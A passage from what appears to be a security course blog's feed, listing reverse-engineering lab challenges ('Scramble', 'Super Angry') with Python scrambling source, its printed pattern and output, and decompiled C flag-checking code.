&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">6760&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x27(2023 Lab - Scramble)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/</guid><description>&lt;h1 id="simple-reverse---0x272023-lab---scramble">
 Simple Reverse - 0x27(2023 Lab - Scramble)
 &lt;a class="anchor" href="#simple-reverse---0x272023-lab---scramble">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler scramble.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">generate_scramble_pattern&lt;/span>(pattern_length, max_shift, max_add_sub):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, pattern_length)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> operation &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;add&amp;#39;&lt;/span>, add_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;sub&amp;#39;&lt;/span>, sub_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shift_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_shift)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;lsh&amp;#39;&lt;/span>, shift_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> scramble_pattern
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">apply_scramble_pattern&lt;/span>(input_bytes, patterns):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i, operations &lt;span style="color:#f92672">in&lt;/span> enumerate(patterns):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">=&lt;/span> input_bytes[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> operation &lt;span style="color:#f92672">in&lt;/span> operations:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> operation &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;add&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">+=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;sub&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">-=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;lsh&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">&amp;lt;&amp;lt;=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">&amp;amp;=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result&lt;span style="color:#f92672">.&lt;/span>append(src)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k_FLAG &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FLAG&lt;/span>&lt;span style="color:#e6db74">{REDACTED}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>patterns &lt;span style="color:#f92672">=&lt;/span> [generate_scramble_pattern(&lt;span style="color:#ae81ff">6&lt;/span>, max_shift&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>, max_add_sub&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0xffff&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(k_FLAG)) ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scrambled_result &lt;span style="color:#f92672">=&lt;/span> apply_scramble_pattern(k_FLAG, patterns)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Input Bytes:&amp;#34;&lt;/span>, k_FLAG, len(k_FLAG))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># REDACTED, 42&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Scramble Pattern:&amp;#34;&lt;/span>, patterns)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [[(&amp;#39;sub&amp;#39;, 20935)], [(&amp;#39;sub&amp;#39;, 31575), (&amp;#39;lsh&amp;#39;, 9), (&amp;#39;add&amp;#39;, 45363), (&amp;#39;add&amp;#39;, 35372), (&amp;#39;sub&amp;#39;, 15465)], [(&amp;#39;add&amp;#39;, 19123), (&amp;#39;add&amp;#39;, 35260), (&amp;#39;sub&amp;#39;, 49421), (&amp;#39;lsh&amp;#39;, 8)], [(&amp;#39;lsh&amp;#39;, 1), (&amp;#39;sub&amp;#39;, 4977), (&amp;#39;sub&amp;#39;, 55837)], [(&amp;#39;add&amp;#39;, 16937)], [(&amp;#39;sub&amp;#39;, 56984), (&amp;#39;lsh&amp;#39;, 2), (&amp;#39;sub&amp;#39;, 32363), (&amp;#39;sub&amp;#39;, 46293)], [(&amp;#39;sub&amp;#39;, 94), (&amp;#39;sub&amp;#39;, 48860), (&amp;#39;sub&amp;#39;, 18342), (&amp;#39;lsh&amp;#39;, 3)], [(&amp;#39;add&amp;#39;, 37549), (&amp;#39;sub&amp;#39;, 36283), (&amp;#39;lsh&amp;#39;, 6), (&amp;#39;add&amp;#39;, 6253)], [(&amp;#39;add&amp;#39;, 34661), (&amp;#39;sub&amp;#39;, 13281), (&amp;#39;sub&amp;#39;, 64107)], [(&amp;#39;sub&amp;#39;, 8525), (&amp;#39;sub&amp;#39;, 30349), (&amp;#39;sub&amp;#39;, 26744)], [(&amp;#39;lsh&amp;#39;, 2), (&amp;#39;sub&amp;#39;, 18120), (&amp;#39;sub&amp;#39;, 63091), (&amp;#39;add&amp;#39;, 17287), (&amp;#39;sub&amp;#39;, 37618), (&amp;#39;add&amp;#39;, 2237)], [(&amp;#39;sub&amp;#39;, 48573), (&amp;#39;sub&amp;#39;, 4449), (&amp;#39;add&amp;#39;, 36013), (&amp;#39;sub&amp;#39;, 64051)], [(&amp;#39;add&amp;#39;, 10415), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 10)], [(&amp;#39;add&amp;#39;, 5676), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 32002), (&amp;#39;sub&amp;#39;, 60775)], [(&amp;#39;add&amp;#39;, 35939), (&amp;#39;sub&amp;#39;, 32666), (&amp;#39;sub&amp;#39;, 45639), (&amp;#39;add&amp;#39;, 2077), (&amp;#39;sub&amp;#39;, 16253)], [(&amp;#39;sub&amp;#39;, 30392), (&amp;#39;sub&amp;#39;, 26913), (&amp;#39;sub&amp;#39;, 14009), (&amp;#39;sub&amp;#39;, 62416)], [(&amp;#39;sub&amp;#39;, 15056), (&amp;#39;sub&amp;#39;, 40527)], [(&amp;#39;lsh&amp;#39;, 5)], [(&amp;#39;lsh&amp;#39;, 1), (&amp;#39;sub&amp;#39;, 16070)], [(&amp;#39;add&amp;#39;, 2045)], [(&amp;#39;lsh&amp;#39;, 8), (&amp;#39;add&amp;#39;, 37087), (&amp;#39;sub&amp;#39;, 22013), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;lsh&amp;#39;, 2)], [(&amp;#39;add&amp;#39;, 31880), (&amp;#39;sub&amp;#39;, 56557), (&amp;#39;lsh&amp;#39;, 6), (&amp;#39;lsh&amp;#39;, 5), (&amp;#39;lsh&amp;#39;, 8), (&amp;#39;add&amp;#39;, 15535)], [(&amp;#39;add&amp;#39;, 22937), (&amp;#39;add&amp;#39;, 4060)], [(&amp;#39;add&amp;#39;, 8462), (&amp;#39;sub&amp;#39;, 4463), (&amp;#39;sub&amp;#39;, 45810), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;sub&amp;#39;, 10144), (&amp;#39;lsh&amp;#39;, 8), (&amp;#39;lsh&amp;#39;, 5), (&amp;#39;lsh&amp;#39;, 1), (&amp;#39;lsh&amp;#39;, 8)], [(&amp;#39;add&amp;#39;, 49937), (&amp;#39;lsh&amp;#39;, 2), (&amp;#39;add&amp;#39;, 60982), (&amp;#39;sub&amp;#39;, 24799)], [(&amp;#39;lsh&amp;#39;, 4), (&amp;#39;add&amp;#39;, 53340), (&amp;#39;add&amp;#39;, 50619), (&amp;#39;sub&amp;#39;, 56111), (&amp;#39;add&amp;#39;, 6134), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;sub&amp;#39;, 22577), (&amp;#39;sub&amp;#39;, 50645)], [(&amp;#39;add&amp;#39;, 21265), (&amp;#39;sub&amp;#39;, 41440)], [(&amp;#39;add&amp;#39;, 63314), (&amp;#39;sub&amp;#39;, 45755), (&amp;#39;add&amp;#39;, 62216)], [(&amp;#39;sub&amp;#39;, 52616)], [(&amp;#39;add&amp;#39;, 21192)], [(&amp;#39;add&amp;#39;, 62573), (&amp;#39;sub&amp;#39;,18811)], [(&amp;#39;add&amp;#39;, 35452), (&amp;#39;sub&amp;#39;, 11573), (&amp;#39;sub&amp;#39;, 49079), (&amp;#39;sub&amp;#39;, 36361), (&amp;#39;sub&amp;#39;, 26862), (&amp;#39;lsh&amp;#39;, 9)], [(&amp;#39;add&amp;#39;, 13610), (&amp;#39;lsh&amp;#39;, 7), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;sub&amp;#39;, 28490), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 44742)], [(&amp;#39;lsh&amp;#39;, 10), (&amp;#39;sub&amp;#39;, 1797), (&amp;#39;sub&amp;#39;, 10564), (&amp;#39;add&amp;#39;, 12394)], [(&amp;#39;add&amp;#39;, 45165), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;sub&amp;#39;, 60610), (&amp;#39;sub&amp;#39;, 63002), (&amp;#39;sub&amp;#39;, 14851), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;add&amp;#39;, 34840), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;sub&amp;#39;, 16907)], [(&amp;#39;add&amp;#39;, 4404), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 7), (&amp;#39;lsh&amp;#39;, 6)], [(&amp;#39;lsh&amp;#39;, 6), (&amp;#39;add&amp;#39;, 51738), (&amp;#39;sub&amp;#39;, 24621), (&amp;#39;add&amp;#39;, 58646)], [(&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;add&amp;#39;, 29375), (&amp;#39;sub&amp;#39;, 419), (&amp;#39;add&amp;#39;, 2854), (&amp;#39;sub&amp;#39;, 11878), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 40151)], [(&amp;#39;add&amp;#39;, 22953)]]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Scrambled Result:&amp;#34;&lt;/span>, scrambled_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler output.txt&lt;/p></description></item><item><title>Simple Reverse - 0x28(2023 Lab - Super Angry)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/</guid><description>&lt;h1 id="simple-reverse---0x282023-lab---super-angry">
 Simple Reverse - 0x28(2023 Lab - Super Angry)
 &lt;a class="anchor" href="#simple-reverse---0x282023-lab---super-angry">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>user_input; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v6; &lt;span style="color:#75715e">// rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">128&lt;/span>]; &lt;span style="color:#75715e">// [rsp+10h] [rbp-B0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> user_input_cp[&lt;span style="color:#ae81ff">6&lt;/span>]; &lt;span style="color:#75715e">// [rsp+90h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> __readfsqword(&lt;span style="color:#ae81ff">0x28u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( argc &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)argv[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>user_input;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">3&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> user_input[&lt;span style="color:#ae81ff">2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user_input_cp[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_fn((&lt;span style="color:#66d9ef">__int64&lt;/span>)user_input_cp, output, &lt;span style="color:#ae81ff">0x20uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>memcmp(output, verify_key, &lt;span style="color:#ae81ff">0x80uLL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Incorrect!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
